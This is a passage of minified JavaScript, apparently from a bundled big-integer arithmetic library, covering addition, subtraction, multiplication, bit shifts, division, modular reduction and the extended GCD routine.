if(C!==this)for(;j<C.length;j++)this.words[j]=C.words[j];return this},s.prototype.add=function(d){var _;return d.negative!==0&&this.negative===0?(d.negative=0,_=this.sub(d),d.negative^=1,_):d.negative===0&&this.negative!==0?(this.negative=0,_=d.sub(this),this.negative=1,_):this.length>d.length?this.clone().iadd(d):d.clone().iadd(this)},s.prototype.isub=function(d){if(d.negative!==0){d.negative=0;var _=this.iadd(d);return d.negative=1,_._normSign()}else if(this.negative!==0)return this.negative=0,this.iadd(d),this.negative=1,this._normSign();var C=this.cmp(d);if(C===0)return this.negative=0,this.length=1,this.words[0]=0,this;var M,R;C>0?(M=this,R=d):(M=d,R=this);for(var j=0,H=0;H<R.length;H++)_=(M.words[H]|0)-(R.words[H]|0)+j,j=_>>26,this.words[H]=_&67108863;for(;j!==0&&H<M.length;H++)_=(M.words[H]|0)+j,j=_>>26,this.words[H]=_&67108863;if(j===0&&H<M.length&&M!==this)for(;H<M.length;H++)this.words[H]=M.words[H];return this.length=Math.max(this.length,H),M!==this&&(this.negative=1),this._strip()},s.prototype.sub=function(d){return this.clone().isub(d)};function A(S,d,_){_.negative=d.negative^S.negative;var C=S.length+d.length|0;_.length=C,C=C-1|0;var M=S.words[0]|0,R=d.words[0]|0,j=M*R,H=j&67108863,D=j/67108864|0;_.words[0]=H;for(var y=1;y<C;y++){for(var V=D>>>26,oe=D&67108863,ce=Math.min(y,d.length-1),he=Math.max(0,y-S.length+1);he<=ce;he++){var Ce=y-he|0;M=S.words[Ce]|0,R=d.words[he]|0,j=M*R+oe,V+=j/67108864|0,oe=j&67108863}_.words[y]=oe|0,D=V|0}return D!==0?_.words[y]=D|0:_.length--,_._strip()}var b=function(d,_,C){var M=d.words,R=_.words,j=C.words,H=0,D,y,V,oe=M[0]|0,ce=oe&8191,he=oe>>>13,Ce=M[1]|0,Ae=Ce&8191,Pe=Ce>>>13,gt=M[2]|0,je=gt&8191,Ue=gt>>>13,Pt=M[3]|0,We=Pt&8191,Ke=Pt>>>13,ji=M[4]|0,ot=ji&8191,vt=ji>>>13,Vi=M[5]|0,at=Vi&8191,Xe=Vi>>>13,an=M[6]|0,lt=an&8191,ct=an>>>13,vn=M[7]|0,ut=vn&8191,P=vn>>>13,m=M[8]|0,v=m&8191,F=m>>>13,G=M[9]|0,J=G&8191,te=G>>>13,Oe=R[0]|0,Le=Oe&8191,Re=Oe>>>13,mt=R[1]|0,ke=mt&8191,Lt=mt>>>13,vc=R[2]|0,Vt=vc&8191,_t=vc>>>13,Ca=R[3]|0,Dt=Ca&8191,pt=Ca>>>13,_c=R[4]|0,At=_c&8191,Ft=_c>>>13,Is=R[5]|0,zt=Is&8191,Ge=Is>>>13,Ec=R[6]|0,Et=Ec&8191,It=Ec>>>13,xh=R[7]|0,Yt=xh&8191,yt=xh>>>13,kh=R[8]|0,Zt=kh&8191,bt=kh>>>13,Ic=R[9]|0,Ot=Ic&8191,xt=Ic>>>13;C.negative=d.negative^_.negative,C.length=19,D=Math.imul(ce,Le),y=Math.imul(ce,Re),y=y+Math.imul(he,Le)|0,V=Math.imul(he,Re);var Br=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Br>>>26)|0,Br&=67108863,D=Math.imul(Ae,Le),y=Math.imul(Ae,Re),y=y+Math.imul(Pe,Le)|0,V=Math.imul(Pe,Re),D=D+Math.imul(ce,ke)|0,y=y+Math.imul(ce,Lt)|0,y=y+Math.imul(he,ke)|0,V=V+Math.imul(he,Lt)|0;var Ra=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Ra>>>26)|0,Ra&=67108863,D=Math.imul(je,Le),y=Math.imul(je,Re),y=y+Math.imul(Ue,Le)|0,V=Math.imul(Ue,Re),D=D+Math.imul(Ae,ke)|0,y=y+Math.imul(Ae,Lt)|0,y=y+Math.imul(Pe,ke)|0,V=V+Math.imul(Pe,Lt)|0,D=D+Math.imul(ce,Vt)|0,y=y+Math.imul(ce,_t)|0,y=y+Math.imul(he,Vt)|0,V=V+Math.imul(he,_t)|0;var Ma=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Ma>>>26)|0,Ma&=67108863,D=Math.imul(We,Le),y=Math.imul(We,Re),y=y+Math.imul(Ke,Le)|0,V=Math.imul(Ke,Re),D=D+Math.imul(je,ke)|0,y=y+Math.imul(je,Lt)|0,y=y+Math.imul(Ue,ke)|0,V=V+Math.imul(Ue,Lt)|0,D=D+Math.imul(Ae,Vt)|0,y=y+Math.imul(Ae,_t)|0,y=y+Math.imul(Pe,Vt)|0,V=V+Math.imul(Pe,_t)|0,D=D+Math.imul(ce,Dt)|0,y=y+Math.imul(ce,pt)|0,y=y+Math.imul(he,Dt)|0,V=V+Math.imul(he,pt)|0;var Co=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Co>>>26)|0,Co&=67108863,D=Math.imul(ot,Le),y=Math.imul(ot,Re),y=y+Math.imul(vt,Le)|0,V=Math.imul(vt,Re),D=D+Math.imul(We,ke)|0,y=y+Math.imul(We,Lt)|0,y=y+Math.imul(Ke,ke)|0,V=V+Math.imul(Ke,Lt)|0,D=D+Math.imul(je,Vt)|0,y=y+Math.imul(je,_t)|0,y=y+Math.imul(Ue,Vt)|0,V=V+Math.imul(Ue,_t)|0,D=D+Math.imul(Ae,Dt)|0,y=y+Math.imul(Ae,pt)|0,y=y+Math.imul(Pe,Dt)|0,V=V+Math.imul(Pe,pt)|0,D=D+Math.imul(ce,At)|0,y=y+Math.imul(ce,Ft)|0,y=y+Math.imul(he,At)|0,V=V+Math.imul(he,Ft)|0;var Ro=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Ro>>>26)|0,Ro&=67108863,D=Math.imul(at,Le),y=Math.imul(at,Re),y=y+Math.imul(Xe,Le)|0,V=Math.imul(Xe,Re),D=D+Math.imul(ot,ke)|0,y=y+Math.imul(ot,Lt)|0,y=y+Math.imul(vt,ke)|0,V=V+Math.imul(vt,Lt)|0,D=D+Math.imul(We,Vt)|0,y=y+Math.imul(We,_t)|0,y=y+Math.imul(Ke,Vt)|0,V=V+Math.imul(Ke,_t)|0,D=D+Math.imul(je,Dt)|0,y=y+Math.imul(je,pt)|0,y=y+Math.imul(Ue,Dt)|0,V=V+Math.imul(Ue,pt)|0,D=D+Math.imul(Ae,At)|0,y=y+Math.imul(Ae,Ft)|0,y=y+Math.imul(Pe,At)|0,V=V+Math.imul(Pe,Ft)|0,D=D+Math.imul(ce,zt)|0,y=y+Math.imul(ce,Ge)|0,y=y+Math.imul(he,zt)|0,V=V+Math.imul(he,Ge)|0;var Na=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Na>>>26)|0,Na&=67108863,D=Math.imul(lt,Le),y=Math.imul(lt,Re),y=y+Math.imul(ct,Le)|0,V=Math.imul(ct,Re),D=D+Math.imul(at,ke)|0,y=y+Math.imul(at,Lt)|0,y=y+Math.imul(Xe,ke)|0,V=V+Math.imul(Xe,Lt)|0,D=D+Math.imul(ot,Vt)|0,y=y+Math.imul(ot,_t)|0,y=y+Math.imul(vt,Vt)|0,V=V+Math.imul(vt,_t)|0,D=D+Math.imul(We,Dt)|0,y=y+Math.imul(We,pt)|0,y=y+Math.imul(Ke,Dt)|0,V=V+Math.imul(Ke,pt)|0,D=D+Math.imul(je,At)|0,y=y+Math.imul(je,Ft)|0,y=y+Math.imul(Ue,At)|0,V=V+Math.imul(Ue,Ft)|0,D=D+Math.imul(Ae,zt)|0,y=y+Math.imul(Ae,Ge)|0,y=y+Math.imul(Pe,zt)|0,V=V+Math.imul(Pe,Ge)|0,D=D+Math.imul(ce,Et)|0,y=y+Math.imul(ce,It)|0,y=y+Math.imul(he,Et)|0,V=V+Math.imul(he,It)|0;var Pa=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Pa>>>26)|0,Pa&=67108863,D=Math.imul(ut,Le),y=Math.imul(ut,Re),y=y+Math.imul(P,Le)|0,V=Math.imul(P,Re),D=D+Math.imul(lt,ke)|0,y=y+Math.imul(lt,Lt)|0,y=y+Math.imul(ct,ke)|0,V=V+Math.imul(ct,Lt)|0,D=D+Math.imul(at,Vt)|0,y=y+Math.imul(at,_t)|0,y=y+Math.imul(Xe,Vt)|0,V=V+Math.imul(Xe,_t)|0,D=D+Math.imul(ot,Dt)|0,y=y+Math.imul(ot,pt)|0,y=y+Math.imul(vt,Dt)|0,V=V+Math.imul(vt,pt)|0,D=D+Math.imul(We,At)|0,y=y+Math.imul(We,Ft)|0,y=y+Math.imul(Ke,At)|0,V=V+Math.imul(Ke,Ft)|0,D=D+Math.imul(je,zt)|0,y=y+Math.imul(je,Ge)|0,y=y+Math.imul(Ue,zt)|0,V=V+Math.imul(Ue,Ge)|0,D=D+Math.imul(Ae,Et)|0,y=y+Math.imul(Ae,It)|0,y=y+Math.imul(Pe,Et)|0,V=V+Math.imul(Pe,It)|0,D=D+Math.imul(ce,Yt)|0,y=y+Math.imul(ce,yt)|0,y=y+Math.imul(he,Yt)|0,V=V+Math.imul(he,yt)|0;var Sc=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Sc>>>26)|0,Sc&=67108863,D=Math.imul(v,Le),y=Math.imul(v,Re),y=y+Math.imul(F,Le)|0,V=Math.imul(F,Re),D=D+Math.imul(ut,ke)|0,y=y+Math.imul(ut,Lt)|0,y=y+Math.imul(P,ke)|0,V=V+Math.imul(P,Lt)|0,D=D+Math.imul(lt,Vt)|0,y=y+Math.imul(lt,_t)|0,y=y+Math.imul(ct,Vt)|0,V=V+Math.imul(ct,_t)|0,D=D+Math.imul(at,Dt)|0,y=y+Math.imul(at,pt)|0,y=y+Math.imul(Xe,Dt)|0,V=V+Math.imul(Xe,pt)|0,D=D+Math.imul(ot,At)|0,y=y+Math.imul(ot,Ft)|0,y=y+Math.imul(vt,At)|0,V=V+Math.imul(vt,Ft)|0,D=D+Math.imul(We,zt)|0,y=y+Math.imul(We,Ge)|0,y=y+Math.imul(Ke,zt)|0,V=V+Math.imul(Ke,Ge)|0,D=D+Math.imul(je,Et)|0,y=y+Math.imul(je,It)|0,y=y+Math.imul(Ue,Et)|0,V=V+Math.imul(Ue,It)|0,D=D+Math.imul(Ae,Yt)|0,y=y+Math.imul(Ae,yt)|0,y=y+Math.imul(Pe,Yt)|0,V=V+Math.imul(Pe,yt)|0,D=D+Math.imul(ce,Zt)|0,y=y+Math.imul(ce,bt)|0,y=y+Math.imul(he,Zt)|0,V=V+Math.imul(he,bt)|0;var Ss=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Ss>>>26)|0,Ss&=67108863,D=Math.imul(J,Le),y=Math.imul(J,Re),y=y+Math.imul(te,Le)|0,V=Math.imul(te,Re),D=D+Math.imul(v,ke)|0,y=y+Math.imul(v,Lt)|0,y=y+Math.imul(F,ke)|0,V=V+Math.imul(F,Lt)|0,D=D+Math.imul(ut,Vt)|0,y=y+Math.imul(ut,_t)|0,y=y+Math.imul(P,Vt)|0,V=V+Math.imul(P,_t)|0,D=D+Math.imul(lt,Dt)|0,y=y+Math.imul(lt,pt)|0,y=y+Math.imul(ct,Dt)|0,V=V+Math.imul(ct,pt)|0,D=D+Math.imul(at,At)|0,y=y+Math.imul(at,Ft)|0,y=y+Math.imul(Xe,At)|0,V=V+Math.imul(Xe,Ft)|0,D=D+Math.imul(ot,zt)|0,y=y+Math.imul(ot,Ge)|0,y=y+Math.imul(vt,zt)|0,V=V+Math.imul(vt,Ge)|0,D=D+Math.imul(We,Et)|0,y=y+Math.imul(We,It)|0,y=y+Math.imul(Ke,Et)|0,V=V+Math.imul(Ke,It)|0,D=D+Math.imul(je,Yt)|0,y=y+Math.imul(je,yt)|0,y=y+Math.imul(Ue,Yt)|0,V=V+Math.imul(Ue,yt)|0,D=D+Math.imul(Ae,Zt)|0,y=y+Math.imul(Ae,bt)|0,y=y+Math.imul(Pe,Zt)|0,V=V+Math.imul(Pe,bt)|0,D=D+Math.imul(ce,Ot)|0,y=y+Math.imul(ce,xt)|0,y=y+Math.imul(he,Ot)|0,V=V+Math.imul(he,xt)|0;var La=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(La>>>26)|0,La&=67108863,D=Math.imul(J,ke),y=Math.imul(J,Lt),y=y+Math.imul(te,ke)|0,V=Math.imul(te,Lt),D=D+Math.imul(v,Vt)|0,y=y+Math.imul(v,_t)|0,y=y+Math.imul(F,Vt)|0,V=V+Math.imul(F,_t)|0,D=D+Math.imul(ut,Dt)|0,y=y+Math.imul(ut,pt)|0,y=y+Math.imul(P,Dt)|0,V=V+Math.imul(P,pt)|0,D=D+Math.imul(lt,At)|0,y=y+Math.imul(lt,Ft)|0,y=y+Math.imul(ct,At)|0,V=V+Math.imul(ct,Ft)|0,D=D+Math.imul(at,zt)|0,y=y+Math.imul(at,Ge)|0,y=y+Math.imul(Xe,zt)|0,V=V+Math.imul(Xe,Ge)|0,D=D+Math.imul(ot,Et)|0,y=y+Math.imul(ot,It)|0,y=y+Math.imul(vt,Et)|0,V=V+Math.imul(vt,It)|0,D=D+Math.imul(We,Yt)|0,y=y+Math.imul(We,yt)|0,y=y+Math.imul(Ke,Yt)|0,V=V+Math.imul(Ke,yt)|0,D=D+Math.imul(je,Zt)|0,y=y+Math.imul(je,bt)|0,y=y+Math.imul(Ue,Zt)|0,V=V+Math.imul(Ue,bt)|0,D=D+Math.imul(Ae,Ot)|0,y=y+Math.imul(Ae,xt)|0,y=y+Math.imul(Pe,Ot)|0,V=V+Math.imul(Pe,xt)|0;var Mo=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Mo>>>26)|0,Mo&=67108863,D=Math.imul(J,Vt),y=Math.imul(J,_t),y=y+Math.imul(te,Vt)|0,V=Math.imul(te,_t),D=D+Math.imul(v,Dt)|0,y=y+Math.imul(v,pt)|0,y=y+Math.imul(F,Dt)|0,V=V+Math.imul(F,pt)|0,D=D+Math.imul(ut,At)|0,y=y+Math.imul(ut,Ft)|0,y=y+Math.imul(P,At)|0,V=V+Math.imul(P,Ft)|0,D=D+Math.imul(lt,zt)|0,y=y+Math.imul(lt,Ge)|0,y=y+Math.imul(ct,zt)|0,V=V+Math.imul(ct,Ge)|0,D=D+Math.imul(at,Et)|0,y=y+Math.imul(at,It)|0,y=y+Math.imul(Xe,Et)|0,V=V+Math.imul(Xe,It)|0,D=D+Math.imul(ot,Yt)|0,y=y+Math.imul(ot,yt)|0,y=y+Math.imul(vt,Yt)|0,V=V+Math.imul(vt,yt)|0,D=D+Math.imul(We,Zt)|0,y=y+Math.imul(We,bt)|0,y=y+Math.imul(Ke,Zt)|0,V=V+Math.imul(Ke,bt)|0,D=D+Math.imul(je,Ot)|0,y=y+Math.imul(je,xt)|0,y=y+Math.imul(Ue,Ot)|0,V=V+Math.imul(Ue,xt)|0;var Fi=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Fi>>>26)|0,Fi&=67108863,D=Math.imul(J,Dt),y=Math.imul(J,pt),y=y+Math.imul(te,Dt)|0,V=Math.imul(te,pt),D=D+Math.imul(v,At)|0,y=y+Math.imul(v,Ft)|0,y=y+Math.imul(F,At)|0,V=V+Math.imul(F,Ft)|0,D=D+Math.imul(ut,zt)|0,y=y+Math.imul(ut,Ge)|0,y=y+Math.imul(P,zt)|0,V=V+Math.imul(P,Ge)|0,D=D+Math.imul(lt,Et)|0,y=y+Math.imul(lt,It)|0,y=y+Math.imul(ct,Et)|0,V=V+Math.imul(ct,It)|0,D=D+Math.imul(at,Yt)|0,y=y+Math.imul(at,yt)|0,y=y+Math.imul(Xe,Yt)|0,V=V+Math.imul(Xe,yt)|0,D=D+Math.imul(ot,Zt)|0,y=y+Math.imul(ot,bt)|0,y=y+Math.imul(vt,Zt)|0,V=V+Math.imul(vt,bt)|0,D=D+Math.imul(We,Ot)|0,y=y+Math.imul(We,xt)|0,y=y+Math.imul(Ke,Ot)|0,V=V+Math.imul(Ke,xt)|0;var Zr=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Zr>>>26)|0,Zr&=67108863,D=Math.imul(J,At),y=Math.imul(J,Ft),y=y+Math.imul(te,At)|0,V=Math.imul(te,Ft),D=D+Math.imul(v,zt)|0,y=y+Math.imul(v,Ge)|0,y=y+Math.imul(F,zt)|0,V=V+Math.imul(F,Ge)|0,D=D+Math.imul(ut,Et)|0,y=y+Math.imul(ut,It)|0,y=y+Math.imul(P,Et)|0,V=V+Math.imul(P,It)|0,D=D+Math.imul(lt,Yt)|0,y=y+Math.imul(lt,yt)|0,y=y+Math.imul(ct,Yt)|0,V=V+Math.imul(ct,yt)|0,D=D+Math.imul(at,Zt)|0,y=y+Math.imul(at,bt)|0,y=y+Math.imul(Xe,Zt)|0,V=V+Math.imul(Xe,bt)|0,D=D+Math.imul(ot,Ot)|0,y=y+Math.imul(ot,xt)|0,y=y+Math.imul(vt,Ot)|0,V=V+Math.imul(vt,xt)|0;var No=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(No>>>26)|0,No&=67108863,D=Math.imul(J,zt),y=Math.imul(J,Ge),y=y+Math.imul(te,zt)|0,V=Math.imul(te,Ge),D=D+Math.imul(v,Et)|0,y=y+Math.imul(v,It)|0,y=y+Math.imul(F,Et)|0,V=V+Math.imul(F,It)|0,D=D+Math.imul(ut,Yt)|0,y=y+Math.imul(ut,yt)|0,y=y+Math.imul(P,Yt)|0,V=V+Math.imul(P,yt)|0,D=D+Math.imul(lt,Zt)|0,y=y+Math.imul(lt,bt)|0,y=y+Math.imul(ct,Zt)|0,V=V+Math.imul(ct,bt)|0,D=D+Math.imul(at,Ot)|0,y=y+Math.imul(at,xt)|0,y=y+Math.imul(Xe,Ot)|0,V=V+Math.imul(Xe,xt)|0;var Tc=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Tc>>>26)|0,Tc&=67108863,D=Math.imul(J,Et),y=Math.imul(J,It),y=y+Math.imul(te,Et)|0,V=Math.imul(te,It),D=D+Math.imul(v,Yt)|0,y=y+Math.imul(v,yt)|0,y=y+Math.imul(F,Yt)|0,V=V+Math.imul(F,yt)|0,D=D+Math.imul(ut,Zt)|0,y=y+Math.imul(ut,bt)|0,y=y+Math.imul(P,Zt)|0,V=V+Math.imul(P,bt)|0,D=D+Math.imul(lt,Ot)|0,y=y+Math.imul(lt,xt)|0,y=y+Math.imul(ct,Ot)|0,V=V+Math.imul(ct,xt)|0;var Da=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Da>>>26)|0,Da&=67108863,D=Math.imul(J,Yt),y=Math.imul(J,yt),y=y+Math.imul(te,Yt)|0,V=Math.imul(te,yt),D=D+Math.imul(v,Zt)|0,y=y+Math.imul(v,bt)|0,y=y+Math.imul(F,Zt)|0,V=V+Math.imul(F,bt)|0,D=D+Math.imul(ut,Ot)|0,y=y+Math.imul(ut,xt)|0,y=y+Math.imul(P,Ot)|0,V=V+Math.imul(P,xt)|0;var Oa=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Oa>>>26)|0,Oa&=67108863,D=Math.imul(J,Zt),y=Math.imul(J,bt),y=y+Math.imul(te,Zt)|0,V=Math.imul(te,bt),D=D+Math.imul(v,Ot)|0,y=y+Math.imul(v,xt)|0,y=y+Math.imul(F,Ot)|0,V=V+Math.imul(F,xt)|0;var Ba=(H+D|0)+((y&8191)<<13)|0;H=(V+(y>>>13)|0)+(Ba>>>26)|0,Ba&=67108863,D=Math.imul(J,Ot),y=Math.imul(J,xt),y=y+Math.imul(te,Ot)|0,V=Math.imul(te,xt);var Po=(H+D|0)+((y&8191)<<13)|0;return H=(V+(y>>>13)|0)+(Po>>>26)|0,Po&=67108863,j[0]=Br,j[1]=Ra,j[2]=Ma,j[3]=Co,j[4]=Ro,j[5]=Na,j[6]=Pa,j[7]=Sc,j[8]=Ss,j[9]=La,j[10]=Mo,j[11]=Fi,j[12]=Zr,j[13]=No,j[14]=Tc,j[15]=Da,j[16]=Oa,j[17]=Ba,j[18]=Po,H!==0&&(j[19]=H,C.length++),C};Math.imul||(b=A);function E(S,d,_){_.negative=d.negative^S.negative,_.length=S.length+d.length;for(var C=0,M=0,R=0;R<_.length-1;R++){var j=M;M=0;for(var H=C&67108863,D=Math.min(R,d.length-1),y=Math.max(0,R-S.length+1);y<=D;y++){var V=R-y,oe=S.words[V]|0,ce=d.words[y]|0,he=oe*ce,Ce=he&67108863;j=j+(he/67108864|0)|0,Ce=Ce+H|0,H=Ce&67108863,j=j+(Ce>>>26)|0,M+=j>>>26,j&=67108863}_.words[R]=H,C=j,j=M}return C!==0?_.words[R]=C:_.length--,_._strip()}function O(S,d,_){return E(S,d,_)}s.prototype.mulTo=function(d,_){var C,M=this.length+d.length;return this.length===10&&d.length===10?C=b(this,d,_):M<63?C=A(this,d,_):M<1024?C=E(this,d,_):C=O(this,d,_),C},s.prototype.mul=function(d){var _=new s(null);return _.words=new Array(this.length+d.length),this.mulTo(d,_)},s.prototype.mulf=function(d){var _=new s(null);return _.words=new Array(this.length+d.length),O(this,d,_)},s.prototype.imul=function(d){return this.clone().mulTo(d,this)},s.prototype.imuln=function(d){var _=d<0;_&&(d=-d),r(typeof d=="number"),r(d<67108864);for(var C=0,M=0;M<this.length;M++){var R=(this.words[M]|0)*d,j=(R&67108863)+(C&67108863);C>>=26,C+=R/67108864|0,C+=j>>>26,this.words[M]=j&67108863}return C!==0&&(this.words[M]=C,this.length++),_?this.ineg():this},s.prototype.muln=function(d){return this.clone().imuln(d)},s.prototype.sqr=function(){return this.mul(this)},s.prototype.isqr=function(){return this.imul(this.clone())},s.prototype.pow=function(d){var _=I(d);if(_.length===0)return new s(1);for(var C=this,M=0;M<_.length&&_[M]===0;M++,C=C.sqr());if(++M<_.length)for(var R=C.sqr();M<_.length;M++,R=R.sqr())_[M]!==0&&(C=C.mul(R));return C},s.prototype.iushln=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26,M=67108863>>>26-_<<26-_,R;if(_!==0){var j=0;for(R=0;R<this.length;R++){var H=this.words[R]&M,D=(this.words[R]|0)-H<<_;this.words[R]=D|j,j=H>>>26-_}j&&(this.words[R]=j,this.length++)}if(C!==0){for(R=this.length-1;R>=0;R--)this.words[R+C]=this.words[R];for(R=0;R<C;R++)this.words[R]=0;this.length+=C}return this._strip()},s.prototype.ishln=function(d){return r(this.negative===0),this.iushln(d)},s.prototype.iushrn=function(d,_,C){r(typeof d=="number"&&d>=0);var M;_?M=(_-_%26)/26:M=0;var R=d%26,j=Math.min((d-R)/26,this.length),H=67108863^67108863>>>R<<R,D=C;if(M-=j,M=Math.max(0,M),D){for(var y=0;y<j;y++)D.words[y]=this.words[y];D.length=j}if(j!==0)if(this.length>j)for(this.length-=j,y=0;y<this.length;y++)this.words[y]=this.words[y+j];else this.words[0]=0,this.length=1;var V=0;for(y=this.length-1;y>=0&&(V!==0||y>=M);y--){var oe=this.words[y]|0;this.words[y]=V<<26-R|oe>>>R,V=oe&H}return D&&V!==0&&(D.words[D.length++]=V),this.length===0&&(this.words[0]=0,this.length=1),this._strip()},s.prototype.ishrn=function(d,_,C){return r(this.negative===0),this.iushrn(d,_,C)},s.prototype.shln=function(d){return this.clone().ishln(d)},s.prototype.ushln=function(d){return this.clone().iushln(d)},s.prototype.shrn=function(d){return this.clone().ishrn(d)},s.prototype.ushrn=function(d){return this.clone().iushrn(d)},s.prototype.testn=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26,M=1<<_;if(this.length<=C)return!1;var R=this.words[C];return!!(R&M)},s.prototype.imaskn=function(d){r(typeof d=="number"&&d>=0);var _=d%26,C=(d-_)/26;if(r(this.negative===0,"imaskn works only with positive numbers"),this.length<=C)return this;if(_!==0&&C++,this.length=Math.min(C,this.length),_!==0){var M=67108863^67108863>>>_<<_;this.words[this.length-1]&=M}return this._strip()},s.prototype.maskn=function(d){return this.clone().imaskn(d)},s.prototype.iaddn=function(d){return r(typeof d=="number"),r(d<67108864),d<0?this.isubn(-d):this.negative!==0?this.length===1&&(this.words[0]|0)<=d?(this.words[0]=d-(this.words[0]|0),this.negative=0,this):(this.negative=0,this.isubn(d),this.negative=1,this):this._iaddn(d)},s.prototype._iaddn=function(d){this.words[0]+=d;for(var _=0;_<this.length&&this.words[_]>=67108864;_++)this.words[_]-=67108864,_===this.length-1?this.words[_+1]=1:this.words[_+1]++;return this.length=Math.max(this.length,_+1),this},s.prototype.isubn=function(d){if(r(typeof d=="number"),r(d<67108864),d<0)return this.iaddn(-d);if(this.negative!==0)return this.negative=0,this.iaddn(d),this.negative=1,this;if(this.words[0]-=d,this.length===1&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var _=0;_<this.length&&this.words[_]<0;_++)this.words[_]+=67108864,this.words[_+1]-=1;return this._strip()},s.prototype.addn=function(d){return this.clone().iaddn(d)},s.prototype.subn=function(d){return this.clone().isubn(d)},s.prototype.iabs=function(){return this.negative=0,this},s.prototype.abs=function(){return this.clone().iabs()},s.prototype._ishlnsubmul=function(d,_,C){var M=d.length+C,R;this._expand(M);var j,H=0;for(R=0;R<d.length;R++){j=(this.words[R+C]|0)+H;var D=(d.words[R]|0)*_;j-=D&67108863,H=(j>>26)-(D/67108864|0),this.words[R+C]=j&67108863}for(;R<this.length-C;R++)j=(this.words[R+C]|0)+H,H=j>>26,this.words[R+C]=j&67108863;if(H===0)return this._strip();for(r(H===-1),H=0,R=0;R<this.length;R++)j=-(this.words[R]|0)+H,H=j>>26,this.words[R]=j&67108863;return this.negative=1,this._strip()},s.prototype._wordDiv=function(d,_){var C=this.length-d.length,M=this.clone(),R=d,j=R.words[R.length-1]|0,H=this._countBits(j);C=26-H,C!==0&&(R=R.ushln(C),M.iushln(C),j=R.words[R.length-1]|0);var D=M.length-R.length,y;if(_!=="mod"){y=new s(null),y.length=D+1,y.words=new Array(y.length);for(var V=0;V<y.length;V++)y.words[V]=0}var oe=M.clone()._ishlnsubmul(R,1,D);oe.negative===0&&(M=oe,y&&(y.words[D]=1));for(var ce=D-1;ce>=0;ce--){var he=(M.words[R.length+ce]|0)*67108864+(M.words[R.length+ce-1]|0);for(he=Math.min(he/j|0,67108863),M._ishlnsubmul(R,he,ce);M.negative!==0;)he--,M.negative=0,M._ishlnsubmul(R,1,ce),M.isZero()||(M.negative^=1);y&&(y.words[ce]=he)}return y&&y._strip(),M._strip(),_!=="div"&&C!==0&&M.iushrn(C),{div:y||null,mod:M}},s.prototype.divmod=function(d,_,C){if(r(!d.isZero()),this.isZero())return{div:new s(0),mod:new s(0)};var M,R,j;return this.negative!==0&&d.negative===0?(j=this.neg().divmod(d,_),_!=="mod"&&(M=j.div.neg()),_!=="div"&&(R=j.mod.neg(),C&&R.negative!==0&&R.iadd(d)),{div:M,mod:R}):this.negative===0&&d.negative!==0?(j=this.divmod(d.neg(),_),_!=="mod"&&(M=j.div.neg()),{div:M,mod:j.mod}):this.negative&d.negative?(j=this.neg().divmod(d.neg(),_),_!=="div"&&(R=j.mod.neg(),C&&R.negative!==0&&R.isub(d)),{div:j.div,mod:R}):d.length>this.length||this.cmp(d)<0?{div:new s(0),mod:this}:d.length===1?_==="div"?{div:this.divn(d.words[0]),mod:null}:_==="mod"?{div:null,mod:new s(this.modrn(d.words[0]))}:{div:this.divn(d.words[0]),mod:new s(this.modrn(d.words[0]))}:this._wordDiv(d,_)},s.prototype.div=function(d){return this.divmod(d,"div",!1).div},s.prototype.mod=function(d){return this.divmod(d,"mod",!1).mod},s.prototype.umod=function(d){return this.divmod(d,"mod",!0).mod},s.prototype.divRound=function(d){var _=this.divmod(d);if(_.mod.isZero())return _.div;var C=_.div.negative!==0?_.mod.isub(d):_.mod,M=d.ushrn(1),R=d.andln(1),j=C.cmp(M);return j<0||R===1&&j===0?_.div:_.div.negative!==0?_.div.isubn(1):_.div.iaddn(1)},s.prototype.modrn=function(d){var _=d<0;_&&(d=-d),r(d<=67108863);for(var C=(1<<26)%d,M=0,R=this.length-1;R>=0;R--)M=(C*M+(this.words[R]|0))%d;return _?-M:M},s.prototype.modn=function(d){return this.modrn(d)},s.prototype.idivn=function(d){var _=d<0;_&&(d=-d),r(d<=67108863);for(var C=0,M=this.length-1;M>=0;M--){var R=(this.words[M]|0)+C*67108864;this.words[M]=R/d|0,C=R%d}return this._strip(),_?this.ineg():this},s.prototype.divn=function(d){return this.clone().idivn(d)},s.prototype.egcd=function(d){r(d.negative===0),r(!d.isZero());var _=this,C=d.clone();_.negative!==0?_=_.umod(d):_=_.clone();for(var M=new s(1),R=new s(0),j=new s(0),H=new s(1),D=0;_.isEven()&&C.isEven();)_.iushrn(1),C.iushrn(1),++D;for(var y=C.clone(),V=_.clone();!_.isZero();){for(var oe=0,ce=1;!(_.words[0]&ce)&&oe<26;++oe,ce<<=1);if(oe>0)for(_.iushrn(oe);oe-- >0;)(M.isOdd()||R.isOdd())&&(M.iadd(y),R.isub(V)),M.iushrn(1),R.iushrn(1);for(var he=0,Ce=1;!(C.words[0]&Ce)&&he<26;++he,Ce<<=1);if(he>0)for(C.iushrn(he);he-- >0;)(j.isOdd()||H.isOdd())&&(j.iadd(y),H.isub(V)),j.iushrn(1),H.iushrn(1);_.cmp(C)>=0?(_.isub(C),M.isub(j),R.isub(H)):(C.isub(_),j.isub(M),H.isub(R))}return{a:j,b:H,gcd:C.iushln(D)}},s.prototype._invmp=function(d){r(d.negative===0),r(!d.isZero());var _=this,C=d.clone();_.negative!==0?_=_.umod(d):_=_.clone();for(var M=new s(1),R=new 